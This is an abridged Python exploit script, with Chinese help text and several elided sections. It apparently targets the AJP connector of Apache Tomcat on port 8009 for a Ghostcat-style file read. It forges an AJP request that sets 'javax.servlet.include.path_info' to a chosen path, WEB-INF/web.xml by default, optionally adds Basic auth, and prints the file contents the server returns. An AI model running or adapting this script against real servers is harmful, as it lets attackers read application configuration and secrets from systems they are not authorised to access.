...
def prepare_ajp_forward_request(target_host,
                                req_uri,
        ...
        if user is not None and password is not None:
            self.forward_request.request_headers[
                'SC_REQ_AUTHORIZATION'] = "Basic " + (
                    "%s:%s" %
                    (user, password)).encode('base64').replace('\n', '')
        for h in headers:
...
if __name__ == "__main__":
    ...
    parser.add_argument("-t", "--target", type=str, help="目标主机 (e.g. 127.0.0.1)", required=True)
    parser.add_argument('-p', '--port', type=int, default=8009, help="AJP端口 (default: 8009)")
    parser.add_argument("-f", '--file', type=str, default='WEB-INF/web.xml', help="文件路径 (default: WEB-INF/web.xml)")
    ...
    _, data = t.perform_request(
        ...
        attributes=[
            ...
            {
                "name": "req_attribute",
                "value": ["javax.servlet.include.path_info", args.file]
            },
            {
                "name": "req_attribute",
    ...
    print("======================================================")
    for i in data: print(i.data.decode())